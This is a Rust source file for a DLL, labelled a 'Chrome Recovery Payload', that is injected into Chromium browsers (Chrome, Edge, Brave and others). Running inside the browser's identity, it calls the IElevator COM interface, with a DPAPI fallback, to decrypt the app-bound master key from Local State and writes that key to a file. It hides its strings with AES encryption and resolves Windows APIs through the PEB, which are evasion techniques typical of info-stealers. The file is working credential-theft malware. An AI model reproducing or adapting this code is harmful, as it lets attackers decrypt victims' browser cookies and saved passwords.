//! Chrome Recovery Payload DLL
//!
//! Injected into a Chromium-based browser process. Runs inside the browser's
//! security identity so IElevator accepts our COM call. Supports all major
//! Chromium browsers (Chrome, Edge, Brave, Opera, Vivaldi, Yandex, etc.).

#![allow(non_snake_case, unused)]

mod elv;
mod dpflbck;
mod reflective_loader;
mod peb;
pub mod xor;
#[path = "cr.rs"]
mod crypto;

use std::{path::PathBuf};

use crate::xor::{aes_str, aes_dec};
use crate::xor::{
    K32_DLL_KEY,           K32_DLL_NONCE,           K32_DLL_CT,
    CREATE_THREAD_KEY,     CREATE_THREAD_NONCE,     CREATE_THREAD_CT,
    APPDATA_ENV_KEY,       APPDATA_ENV_NONCE,       APPDATA_ENV_CT,
    LOCAL_ENV_KEY,         LOCAL_ENV_NONCE,         LOCAL_ENV_CT,
    LOCAL_STATE_KEY,       LOCAL_STATE_NONCE,       LOCAL_STATE_CT,
    APP_BOUND_KEY_KEY,     APP_BOUND_KEY_NONCE,     APP_BOUND_KEY_CT,
    RESULT_ENV_KEY,        RESULT_ENV_NONCE,        RESULT_ENV_CT,
    USER_DATA_ENV_KEY,     USER_DATA_ENV_NONCE,     USER_DATA_ENV_CT,
    DATA_ROOT_ENV_KEY,     DATA_ROOT_ENV_NONCE,     DATA_ROOT_ENV_CT,
    JSON_KEY_BROWSER_KEY,  JSON_KEY_BROWSER_NONCE,  JSON_KEY_BROWSER_CT,
    JSON_KEY_MASTER_KEY,   JSON_KEY_MASTER_NONCE,   JSON_KEY_MASTER_CT,
    JSON_KEY_ERROR_KEY,    JSON_KEY_ERROR_NONCE,    JSON_KEY_ERROR_CT,
    RESULT_FALLBACK_KEY,   RESULT_FALLBACK_NONCE,   RESULT_FALLBACK_CT,
};

type BOOL = i32;
type HINSTANCE = *mut std::ffi::c_void;
const TRUE: BOOL = 1;

pub static mut G_K32_BASE: *mut u8 = std::ptr::null_mut();
const DLL_PROCESS_ATTACH: u32 = 1;

type CreateThreadFn = unsafe extern "system" fn(
    *mut std::ffi::c_void,
    usize,
    Option<unsafe extern "system" fn(*mut std::ffi::c_void) -> u32>,
    *mut std::ffi::c_void,
    u32,
    *mut u32,
) -> *mut std::ffi::c_void;

fn get_create_thread() -> Option<CreateThreadFn> {
    let k32 = unsafe { G_K32_BASE };
    let k32_name = aes_str(K32_DLL_CT, &K32_DLL_KEY, &K32_DLL_NONCE);
    let kernel32 = if !k32.is_null() { k32 } else { peb::get_module_base(&k32_name)? };
    let ct_name = aes_str(CREATE_THREAD_CT, &CREATE_THREAD_KEY, &CREATE_THREAD_NONCE);
    let addr = peb::resolve_export(kernel32, &ct_name)?;
    Some(unsafe { std::mem::transmute(addr) })
}

const APPB: &[u8; 4] = b"APPB";

#[no_mangle]
pub unsafe extern "system" fn DllMain(
    _h: HINSTANCE,
    reason: u32,
    _: *mut std::ffi::c_void,
) -> BOOL {
    if reason == DLL_PROCESS_ATTACH {
        if let Some(create_thread) = get_create_thread() {
            create_thread(
                std::ptr::null_mut(),
                0,
                Some(worker),
                std::ptr::null_mut(),
                0,
                std::ptr::null_mut(),
            );
        }
    }
    TRUE
}

unsafe extern "system" fn worker(_: *mut std::ffi::c_void) -> u32 {
    std::thread::sleep(std::time::Duration::from_millis(1500));
    let r = std::panic::catch_unwind(|| run());
    if let Ok(Err(e)) = r {
        write_error(&e);
    }
    0
}

#[allow(dead_code)]
pub(crate) fn step(_n: u32, _msg: &str) {}

fn get_env(ct: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Option<String> {
    let var_name = aes_str(ct, key, nonce);
    std::env::var(&var_name).ok()
}

fn run() -> Result<(), String> {

    let exe = std::env::current_exe()
        .map(|p| p.to_string_lossy().to_lowercase())
        .unwrap_or_default();

    let local_state_path = resolve_local_state_path(&exe)?;

    let raw = std::fs::read_to_string(&local_state_path)
        .map_err(|_| "e2".to_string())?;

    let key_b64 = {
        let app_key_name = aes_str(APP_BOUND_KEY_CT, &APP_BOUND_KEY_KEY, &APP_BOUND_KEY_NONCE);
        let marker = format!("\"{}\":\"", app_key_name);
        if let Some(start) = raw.find(&marker) {
            let start = start + marker.len();
            if let Some(end) = raw[start..].find('"') {
                raw[start..start + end].to_string()
            } else {
                return Err("e3".to_string());
            }
        } else {
            return Err("e4".to_string());
        }
    };

    let encrypted_key = base64::Engine::decode(
        &base64::engine::general_purpose::STANDARD,
        &key_b64,
    )
    .map_err(|_| "e5".to_string())?;

    if encrypted_key.len() < 4 {
        return Err("e6".to_string());
    }
    if !encrypted_key.starts_with(APPB) {
        return Err("e7".to_string());
    }
    let encrypted_key = &encrypted_key[4..];

    let browser = elv::resolve_browser(&exe);
    let browser_label = browser.map(|b| b.name).unwrap_or("Chromium");

    let com_result = if let Some(b) = browser {
        elv::decrypt_for_browser(b, encrypted_key)
    } else {
        elv::decrypt_app_bound_key(encrypted_key)
    };

    let master_key = com_result.or_else(|_| {
        let r = dpflbck::try_decrypt_app_bound(encrypted_key);
        r.ok_or_else(|| "e8".to_string())
    })
    .map_err(|_| "e9".to_string())?;

    if master_key.len() != 32 {
        return Err("e10".to_string());
    }

    let hex_str: String = master_key.iter().map(|b| format!("{b:02x}")).collect();
    let jk_browser = aes_str(JSON_KEY_BROWSER_CT, &JSON_KEY_BROWSER_KEY, &JSON_KEY_BROWSER_NONCE);
    let jk_master  = aes_str(JSON_KEY_MASTER_CT,  &JSON_KEY_MASTER_KEY,  &JSON_KEY_MASTER_NONCE);
    let json = format!(
        "{{\"{jk_browser}\":\"{}\",\"{jk_master}\":\"{}\"}}",
        browser_label, hex_str
    );

    let path = result_path();
    std::fs::write(&path, &json).map_err(|_| "e11".to_string())?;
    Ok(())
}

fn resolve_local_state_path(exe: &str) -> Result<PathBuf, String> {
    let appdata_name = aes_str(APPDATA_ENV_CT, &APPDATA_ENV_KEY, &APPDATA_ENV_NONCE);
    let local_name   = aes_str(LOCAL_ENV_CT, &LOCAL_ENV_KEY, &LOCAL_ENV_NONCE);
    let ls_name      = aes_str(LOCAL_STATE_CT, &LOCAL_STATE_KEY, &LOCAL_STATE_NONCE);

    if let Some(rel) = get_env(USER_DATA_ENV_CT, &USER_DATA_ENV_KEY, &USER_DATA_ENV_NONCE) {
        let root = match get_env(DATA_ROOT_ENV_CT, &DATA_ROOT_ENV_KEY, &DATA_ROOT_ENV_NONCE).as_deref() {
            Some("roaming") => std::env::var(&appdata_name),
            _ => std::env::var(&local_name),
        }
        .map_err(|_| "")?;

        let path = PathBuf::from(&root).join(&rel).join(&ls_name);
        if path.exists() {
            return Ok(path);
        }
        return Err("e12".to_string());
    }

    let browser = elv::resolve_browser(exe)
        .ok_or_else(|| "e13".to_string())?;

    let local_appdata =
        std::env::var(&local_name).map_err(|_| "e14".to_string())?;

    let local_state_path = PathBuf::from(&local_appdata)
        .join(browser.user_data_rel)
        .join(&ls_name);

    if !local_state_path.exists() {
        return Err("e15".to_string());
    }
    Ok(local_state_path)
}

fn result_path() -> PathBuf {
    if let Some(p) = get_env(RESULT_ENV_CT, &RESULT_ENV_KEY, &RESULT_ENV_NONCE) {
        return PathBuf::from(p);
    }
    let fallback = aes_str(RESULT_FALLBACK_CT, &RESULT_FALLBACK_KEY, &RESULT_FALLBACK_NONCE);
    std::env::temp_dir().join(fallback)
}

fn write_error(msg: &str) {
    let jk_error = aes_str(JSON_KEY_ERROR_CT, &JSON_KEY_ERROR_KEY, &JSON_KEY_ERROR_NONCE);
    let json = format!("{{\"{jk_error}\":\"{msg}\"}}");
    let p = result_path();
    let _ = std::fs::write(&p, &json);
}
